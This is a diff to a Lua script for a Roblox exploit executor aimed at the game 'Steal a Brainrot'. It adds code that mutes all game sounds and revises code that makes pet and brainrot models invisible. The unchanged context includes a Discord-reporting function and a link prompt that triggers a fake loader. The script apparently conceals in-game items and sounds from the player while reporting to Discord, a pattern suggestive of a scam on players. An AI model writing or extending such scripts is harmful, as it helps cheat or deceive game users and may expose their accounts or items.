@@ -1,6 +1,6 @@
 -- Script pentru Delta - Steal a Brainrot (Loader PERMANENT + Discord)
 -- Compatibil cu Delta Executor
--- ACUM ASCUNDE ȘI PET-URILE
+-- ACUM OPRESTE TOATE SUNETELE DIN JOC
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -27,28 +27,50 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== ASCUNDE BRAINROT-URILE ȘI PET-URILE =====
+-- ===== OPREȘTE TOATE SUNETELE DIN JOC =====
+local function muteAllSounds()
+    local count = 0
+    -- Caută în toate serviciile
+    local services = {
+        Workspace,
+        game:GetService("Lighting"),
+        game:GetService("ReplicatedStorage"),
+        game:GetService("Players").LocalPlayer.PlayerGui,
+        game:GetService("StarterGui")
+    }
+    
+    for _, service in pairs(services) do
+        pcall(function()
+            for _, sound in pairs(service:GetDescendants()) do
+                if sound:IsA("Sound") then
+                    sound.Volume = 0
+                    sound:Stop()
+                    count = count + 1
+                end
+            end
+        end)
+    end
+    
+    print("✅ " .. count .. " sunete oprite!")
+    return count
+end
+
+-- ===== ASCUNDE BRAINROT-URILE =====
 local function hideBrainrots()
     local count = 0
     for _, obj in pairs(Workspace:GetDescendants()) do
-        if obj:IsA("Model") and obj.Name then
-            local name = obj.Name:lower()
-            if name:find("brainrot") or name:find("brain") or name:find("pet") or name:find("egg") or name:find("creature") then
-                pcall(function()
-                    obj.Transparency = 1
-                    obj.CanCollide = false
-                    
-                    -- Oprește TOATE sunetele din obiect
-                    for _, sound in pairs(obj:GetDescendants()) do
-                        if sound:IsA("Sound") then
-                            sound.Volume = 0
-                            sound:Stop()
-                        end
+        if obj:IsA("Model") and obj.Name and (string.find(obj.Name:lower(), "brainrot") or string.find(obj.Name:lower(), "brain") or string.find(obj.Name:lower(), "pet")) then
+            pcall(function()
+                obj.Transparency = 1
+                obj.CanCollide = false
+                for _, sound in pairs(obj:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        sound.Volume = 0
+                        sound:Stop()
                     end
-                    
-                    count = count + 1
-                end)
-            end
+                end
+                count = count + 1
+            end)
         end
     end
     return count
@@ -387,8 +409,9 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
+            muteAllSounds()  -- <-- OPRESTE TOATE SUNETELE
             local count = hideBrainrots()
-            print("✅ Script activ! " .. count .. " obiecte ascunse.")
+            print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
         end
     end)
 
